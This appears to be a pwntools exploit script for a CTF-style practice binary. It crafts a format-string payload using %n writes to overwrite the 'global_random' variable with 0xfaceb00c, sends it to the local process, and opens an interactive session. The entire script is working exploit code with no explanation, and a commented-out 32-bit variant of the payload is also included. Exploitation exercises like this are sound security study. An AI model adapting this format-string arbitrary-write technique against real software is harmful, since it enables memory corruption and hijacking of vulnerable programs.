#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-arbt-write-64")

print(p.recv())

global_random_addr = p.elf.symbols["global_random"]
facebook = p32(0xfaceb00c)
facebook_dec = "4207849484"

print(hex(global_random_addr))

#buf = p32(global_random_addr) + p32(global_random_addr+2) + "%"+ str(int(0xb00c -8)) + "x%7$n%" + str(int(0xface - 0xb00c)) + "x%8$n"


buf = "%"+ str(int(0xb00c -8 + 8)) + "x%9$n%" + str(int(0xface - 0xb00c)) + "x%10$n"+ "A" + p64(global_random_addr) + p64(global_random_addr+2)


p.sendline(buf)

rec = p.recv()
print(repr(rec))





p.interactive()